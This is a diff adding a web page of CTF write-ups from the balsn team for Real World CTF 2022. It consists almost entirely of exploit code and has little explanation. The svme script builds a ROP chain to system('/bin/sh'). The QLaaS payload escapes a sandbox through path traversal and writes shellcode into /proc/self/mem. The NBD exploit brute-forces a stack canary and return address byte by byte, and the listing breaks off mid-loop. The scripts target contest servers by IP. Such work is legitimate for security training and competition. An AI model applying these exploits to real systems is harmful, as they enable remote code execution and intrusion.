@@ -1,0 +1,803 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Real World CTF 2022</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                clonepwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#svme">svme</a>
+    
+                <a class="dropdown-item" href="#qlaas">qlaas</a>
+    
+                <a class="dropdown-item" href="#who-moved-my-block">who-moved-my-block</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#hack-into-skynet">hack-into-skynet</a>
+    
+                <a class="dropdown-item" href="#api6">api6</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                cryptocurrency
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#tresure-hunter">tresure-hunter</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">clonepwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#svme" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">svme</span>
+            </a>
+    
+<a href="#qlaas" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">qlaas</span>
+            </a>
+    
+<a href="#who-moved-my-block" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">who-moved-my-block</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#hack-into-skynet" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hack-into-skynet</span>
+            </a>
+    
+<a href="#api6" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">api6</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">cryptocurrency</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#tresure-hunter" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tresure-hunter</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="real-world-ctf-2022"><a class="header-link" href="#real-world-ctf-2022"></a>Real World CTF 2022</h1>
+<h2 id="clonepwn"><a class="header-link" href="#clonepwn"></a>clone+pwn</h2>
+<h3 id="svme"><a class="header-link" href="#svme"></a>svme</h3>
+<pre class="hljs"><code>from pwn import *
+
+<span class="hljs-comment">###Util</span>
+opcodeTable = {<span class="hljs-string">&#x27;nop&#x27;</span>:(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;add&#x27;</span>:(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;sub&#x27;</span>:(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;mul&#x27;</span>:(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;lt&#x27;</span>:(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;eq&#x27;</span>:(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;jmp&#x27;</span>:(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;jeq&#x27;</span>:(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;jne&#x27;</span>:(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;push&#x27;</span>:(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;load&#x27;</span>:(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;gload&#x27;</span>:(<span class="hljs-number">11</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;store&#x27;</span>:(<span class="hljs-number">12</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;gstore&#x27;</span>:(<span class="hljs-number">13</span>,<span class="hljs-number">1</span>),
+               <span class="hljs-string">&#x27;print&#x27;</span>:(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;pop&#x27;</span>:(<span class="hljs-number">15</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;call&#x27;</span>:(<span class="hljs-number">16</span>,<span class="hljs-number">3</span>),
+               <span class="hljs-string">&#x27;ret&#x27;</span>:(<span class="hljs-number">17</span>,<span class="hljs-number">0</span>),
+               <span class="hljs-string">&#x27;hlt&#x27;</span>:(<span class="hljs-number">18</span>,<span class="hljs-number">0</span>)}
+
+def Vasm(code):
+    code = code.split(<span class="hljs-string">&#x27;\n&#x27;</span>)
+    TAG = {}
+    TORESOLVE = {}
+    bcode = <span class="hljs-string">b&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> code:
+        cmt = line.find(<span class="hljs-string">&#x27;//&#x27;</span>)
+        <span class="hljs-keyword">if</span> cmt!=-<span class="hljs-number">1</span>:
+            line = line[:line.find(<span class="hljs-string">&#x27;//&#x27;</span>)]
+        line = line.strip()
+        <span class="hljs-keyword">if</span> line==<span class="hljs-string">&#x27;&#x27;</span>:
+            <span class="hljs-keyword">continue</span>
+        line = line.split(<span class="hljs-string">&#x27; &#x27;</span>)
+        opcode = line[<span class="hljs-number">0</span>].strip()
+        <span class="hljs-keyword">if</span> opcode[-<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;:&#x27;</span>:
+            TAG[opcode[:-<span class="hljs-number">1</span>]] = len(bcode)<span class="hljs-regexp">//</span><span class="hljs-number">4</span>
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">if</span> opcode not <span class="hljs-keyword">in</span> opcodeTable:
+            print(f<span class="hljs-string">&#x27;invalid opcode {opcode}&#x27;</span>)
+            <span class="hljs-keyword">exit</span>()
+        bcode+=p32(opcodeTable[opcode][<span class="hljs-number">0</span>])
+        <span class="hljs-keyword">if</span> opcodeTable[opcode][<span class="hljs-number">1</span>]&gt;<span class="hljs-number">0</span>:
+            oprands = line[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)
+            assert len(oprands)==opcodeTable[opcode][<span class="hljs-number">1</span>]
+            <span class="hljs-keyword">for</span> oprand <span class="hljs-keyword">in</span> oprands:
+                oprand = oprand.strip()
+                sign = <span class="hljs-number">1</span>
+                <span class="hljs-keyword">if</span> oprand[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;-&#x27;</span>:
+                    sign = -<span class="hljs-number">1</span>
+                    oprand = oprand[<span class="hljs-number">1</span>:]
+                <span class="hljs-keyword">if</span> oprand[:<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;0x&#x27;</span>:
+                    opr = int(oprand[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)
+                elif oprand[<span class="hljs-number">0</span>]&gt;=<span class="hljs-string">&#x27;0&#x27;</span> and oprand[<span class="hljs-number">0</span>]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>:
+                    opr = int(oprand)
+                <span class="hljs-keyword">else</span>:
+                    <span class="hljs-keyword">if</span> opcode!=<span class="hljs-string">&#x27;jeq&#x27;</span> and opcode!=<span class="hljs-string">&#x27;jne&#x27;</span> and opcode!=<span class="hljs-string">&#x27;jmp&#x27;</span> and opcode!=<span class="hljs-string">&#x27;call&#x27;</span>:
+                        print(<span class="hljs-string">&#x27;inavalid usage of TAG&#x27;</span>)
+                        <span class="hljs-keyword">exit</span>()
+                    TORESOLVE[len(bcode)] = oprand
+                    opr = <span class="hljs-number">0</span>
+                opr*=sign
+                <span class="hljs-keyword">if</span> opr&lt;<span class="hljs-number">0</span>:
+                    opr+=<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">32</span>
+                bcode+=p32(opr)
+    <span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> TORESOLVE:
+        <span class="hljs-keyword">if</span> TORESOLVE[tag] not <span class="hljs-keyword">in</span> TAG:
+            print(f<span class="hljs-string">&#x27;unknown tag {tag}&#x27;</span>)
+            <span class="hljs-keyword">exit</span>()
+        bcode = bcode[:tag]+p32(TAG[TORESOLVE[tag]])+bcode[tag+<span class="hljs-number">4</span>:]
+    return bcode
+
+<span class="hljs-comment">###Addr</span>
+libc_start_offset = <span class="hljs-number">0</span>x26fc0
+system_offset = <span class="hljs-number">0</span>x55410
+bin_sh_offset = <span class="hljs-number">0</span>x1b75aa
+
+<span class="hljs-comment">###ROPgadget</span>
+L_add_rsp_0x40 = <span class="hljs-number">0</span>x125a0b
+L_pop_rdi = <span class="hljs-number">0</span>x26b72
+L_nop = <span class="hljs-number">0</span>x26b73
+
+<span class="hljs-comment">###Exploit</span>
+code = Vasm(f<span class="hljs-string">&#x27;&#x27;&#x27;
+             gload -0x840   //code
+             gload -0x83f   //code
+             jmp NEXT
+             DO_OVERWRITE:
+                pop
+                pop
+                pop
+                load 1
+                load 0
+                ret
+             NEXT:
+             call DO_OVERWRITE,2,0
+             gload 134
+
+             push {libc_start_offset+243}
+             sub
+             gstore 20
+             gload 135
+             gstore 21
+
+             gload 20
+             push {L_add_rsp_0x40}
+             add
+             gstore -10
+             gload 21
+             gstore -9
+
+             gload 20
+             push {L_pop_rdi}
+             add
+             gstore 8
+             gload 21
+             gstore 9
+
+             gload 20
+             push {bin_sh_offset}
+             add
+             gstore 10
+             gload 21
+             gstore 11
+
+             gload 20
+             push {system_offset}
+             add
+             gstore 12
+             gload 21
+             gstore 13
+
+             push 0
+             push 0
+
+             hlt
+             &#x27;&#x27;&#x27;</span>).ljust(<span class="hljs-number">128</span>*<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
+r = remote(<span class="hljs-string">&#x27;47.243.140.252&#x27;</span>,<span class="hljs-number">1337</span>)
+r.send(code)
+r.interactive()</code></pre><h3 id="qlaas"><a class="header-link" href="#qlaas"></a>QLaaS</h3>
+<pre class="hljs"><code>from pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">&#x27;47.242.149.197&#x27;</span>,<span class="hljs-number">7600</span>)
+
+with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:
+    data = f.read()
+
+r.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>,b64e(data))
+<span class="hljs-built_in">line</span> = r.recvuntil(<span class="hljs-string">&#x27;python3.9&#x27;</span>)
+<span class="hljs-keyword">while</span> b<span class="hljs-string">&#x27;r-x&#x27;</span> not in <span class="hljs-built_in">line</span>:
+    <span class="hljs-built_in">line</span> = r.recvline()
+prange = <span class="hljs-built_in">line</span>.<span class="hljs-built_in">split</span>(b<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-built_in">split</span>(b<span class="hljs-string">&#x27;-&#x27;</span>)
+pstart = <span class="hljs-built_in">int</span>(prange[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)
+pend = <span class="hljs-built_in">int</span>(prange[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pstart),<span class="hljs-built_in">hex</span>(pend))
+r.send(p64(pstart)+p64(pend))
+
+r.interactive()</code></pre><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;linux/fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
+
+<span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;H\xbf/bin/sh\x00WH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05&quot;</span>;
+<span class="hljs-keyword">char</span> nopsled[<span class="hljs-number">0x100</span>];
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+  <span class="hljs-keyword">int</span> dfd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./&quot;</span>,O_DIRECTORY);
+  <span class="hljs-keyword">int</span> dfd2 = <span class="hljs-built_in">openat</span>(dfd,<span class="hljs-string">&quot;../../../../../&quot;</span>,O_DIRECTORY);
+  <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">openat</span>(dfd2,<span class="hljs-string">&quot;./proc/self/maps&quot;</span>,O_RDONLY,<span class="hljs-number">0</span>);
+  <span class="hljs-keyword">int</span> fd2 = <span class="hljs-built_in">openat</span>(dfd2,<span class="hljs-string">&quot;./proc/self/mem&quot;</span>,O_WRONLY,<span class="hljs-number">0</span>);
+  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x1000</span>];
+  <span class="hljs-built_in">memset</span>(nopsled,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x100</span>);
+  <span class="hljs-keyword">int</span> sz = <span class="hljs-built_in">read</span>(fd,buf,<span class="hljs-number">0x1000</span>);
+  <span class="hljs-keyword">if</span>(sz&gt;<span class="hljs-number">0</span>) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,sz);
+  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x10</span>)!=<span class="hljs-number">0x10</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;read failed&quot;</span>);
+  <span class="hljs-built_in">lseek</span>(fd2,*(<span class="hljs-keyword">off_t</span>*)(&amp;buf[<span class="hljs-number">8</span>])<span class="hljs-number">-0x100</span>,SEEK_SET);
+  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">write</span>(fd2,shellcode,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(shellcode))!=<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(shellcode)) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;write failed&quot;</span>);
+  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;<span class="hljs-number">16</span>;i++){
+    <span class="hljs-built_in">lseek</span>(fd2,*(<span class="hljs-keyword">off_t</span>*)(&amp;buf[<span class="hljs-number">8</span>])<span class="hljs-number">-0x100</span>*i,SEEK_SET);
+    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">write</span>(fd2,nopsled,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(nopsled))!=<span class="hljs-number">0x100</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;write failed&quot;</span>);
+  }
+  <span class="hljs-built_in">fflush</span>(stdout);
+  _exit(<span class="hljs-number">0</span>);
+}</code></pre><h3 id="who-moved-my-block"><a class="header-link" href="#who-moved-my-block"></a>Who Moved My Block</h3>
+<pre class="hljs"><code><span class="hljs-selector-tag">from</span> pwn import *
+import hashlib
+
+
+def POW(r):
+    prefix = r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;&quot;+&quot;&#x27;</span>,drop=True).<span class="hljs-built_in">split</span>(b<span class="hljs-string">&#x27;&quot;&#x27;</span>)[-<span class="hljs-number">1</span>]
+    difficulty = <span class="hljs-built_in">int</span>(r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;bits&#x27;</span>,drop=True).<span class="hljs-built_in">split</span>(b<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])
+    cnt = <span class="hljs-number">0</span>
+    while True:
+        if cnt%<span class="hljs-number">100000</span>==<span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(cnt)
+        cur = prefix+<span class="hljs-built_in">str</span>(cnt).<span class="hljs-built_in">encode</span>()
+        if <span class="hljs-built_in">int</span>(hashlib.<span class="hljs-built_in">sha256</span>(cur).<span class="hljs-built_in">hexdigest</span>(),<span class="hljs-number">16</span>)&gt;&gt;(<span class="hljs-number">256</span>-difficulty)==<span class="hljs-number">0</span>:
+            r.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(cnt))
+            break
+        cnt+=<span class="hljs-number">1</span>
+
+def <span class="hljs-built_in">getServer</span>():
+    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;47.242.113.232&#x27;</span>,<span class="hljs-number">31337</span>)
+    <span class="hljs-built_in">POW</span>(p)
+    p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27; 0.0.0.0:&#x27;</span>)
+    port = <span class="hljs-built_in">int</span>(p.<span class="hljs-built_in">recvline</span>()[:-<span class="hljs-number">1</span>])
+    return p,port
+
+def <span class="hljs-built_in">sendMsg</span>(msg):
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p32</span>(<span class="hljs-built_in">len</span>(msg),endianness=<span class="hljs-string">&#x27;big&#x27;</span>)+msg)
+
+def <span class="hljs-built_in">negotiate</span>(option,msg):
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;IHAVEOPT&#x27;</span>)
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p32</span>(option,endianness=<span class="hljs-string">&#x27;big&#x27;</span>))
+    <span class="hljs-built_in">sendMsg</span>(msg)
+
+def <span class="hljs-built_in">handleInfo</span>(L,nameL,bufC):
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;IHAVEOPT&#x27;</span>)
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p32</span>(<span class="hljs-number">6</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>))
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p32</span>(L,endianness=<span class="hljs-string">&#x27;big&#x27;</span>))
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p32</span>(nameL,endianness=<span class="hljs-string">&#x27;big&#x27;</span>))
+    r.<span class="hljs-built_in">send</span>(bufC)
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;\x00&#x27;</span>*nameL)
+    r.<span class="hljs-built_in">send</span>(<span class="hljs-built_in">p16</span>(<span class="hljs-number">0</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>))
+    r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;An OPT_INFO request&#x27;</span>)
+
+##<span class="hljs-number">#Add</span>r
+negotiate_offset = <span class="hljs-number">0</span>x9570
+system_plt_offset = <span class="hljs-number">0</span>x3bb0
+read_got_offset = <span class="hljs-number">0</span>x12d00
+bss_offset = <span class="hljs-number">0</span>x13800
+
+###ROPgadget
+C_pop_rdi = <span class="hljs-number">0</span>x4a58
+C_set_param = <span class="hljs-number">0</span>xc2aa
+C_call_func = <span class="hljs-number">0</span>xc290
+
+kAlive,port = <span class="hljs-built_in">getServer</span>()
+IP = <span class="hljs-string">&#x27;47.242.113.232&#x27;</span>
+
+canary = b<span class="hljs-string">&#x27;\x00&#x27;</span>
+while <span class="hljs-built_in">len</span>(canary)&lt;<span class="hljs-number">8</span>:
+    for j in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x100):
+        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(canary),j)
+        r = <span class="hljs-built_in">remote</span>(IP,port)
+        r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;NBDMAGICIHAVEOPT\x00\x03&#x27;</span>) #INIT_PASSWD + opts_magic + smallflags
+        r.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;\x00\x00\x00\x03&#x27;</span>) #<span class="hljs-built_in">cflags</span>(NEWSTYLE|NO_ZEROES) + opts_magic
+        <span class="hljs-built_in">handleInfo</span>(<span class="hljs-number">0</span>x408+<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(canary)+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x408+<span class="hljs-built_in">len</span>(canary)+<span class="hljs-number">1</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x408+canary+<span class="hljs-built_in">p8</span>(j))
+        try:
+            <span class="hljs-built_in">negotiate</span>(<span class="hljs-number">10</span>,b<span class="hljs-string">&#x27;&#x27;</span>)
+            r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;given option is unknown&#x27;</span>)
+            canary+=<span class="hljs-built_in">p8</span>(j)
+            <span class="hljs-built_in">print</span>(canary)
+            <span class="hljs-built_in">negotiate</span>(<span class="hljs-number">2</span>,b<span class="hljs-string">&#x27;&#x27;</span>)
+            r.<span class="hljs-built_in">close</span>()
+            break
+        except:
+            r.<span class="hljs-built_in">close</span>()
+<span class="hljs-built_in">print</span>(canary)
+
+negotiate_addr = <span class="hljs-built_in">p8</span>(negotiate_offset&amp;<span class="hljs-number">0</span>xff)
+while <span class="hljs-built_in">len</span>(negotiate_addr)&lt;<span class="hljs-number">6</span>:
+    if <span class="hljs-built_in">len</span>(negotiate_addr)==<span class="hljs-number">1</span>:
+        ITER = <span class="hljs-number">0</span>x10
+    else:
+        ITER = <span class="hljs-number">0</span>x1
+    if <span class="hljs-built_in">len</span>(negotiate_addr)==<span class="hljs-number">5</span>:
+        START = <span class="hljs-number">0</span>x50
+    else:
+        START = <span class="hljs-number">0</span>
+    for j in <span class="hljs-built_in">range</span>(START,<span class="hljs-number">0</span>x100,ITER):
+        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(negotiate_addr),j)
+        r = <span class="hljs-built_in">remote</span>(IP,port)
+        r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;NBDMAGICIHAVEOPT\x00\x03&#x27;</span>) #INIT_PASSWD + opts_magic + smallflags
+        r.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;\x00\x00\x00\x03&#x27;</span>) #<span class="hljs-built_in">cflags</span>(NEWSTYLE|NO_ZEROES) + opts_magic
+        if <span class="hljs-built_in">len</span>(negotiate_addr)==<span class="hljs-number">1</span>:
+            <span class="hljs-built_in">handleInfo</span>(<span class="hljs-number">0</span>x448+<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(negotiate_addr)+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x448+<span class="hljs-built_in">len</span>(negotiate_addr)+<span class="hljs-number">1</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x408+canary+b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x38+negotiate_addr+<span class="hljs-built_in">p8</span>(j|((negotiate_offset&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0</span>xf)))
+        else:
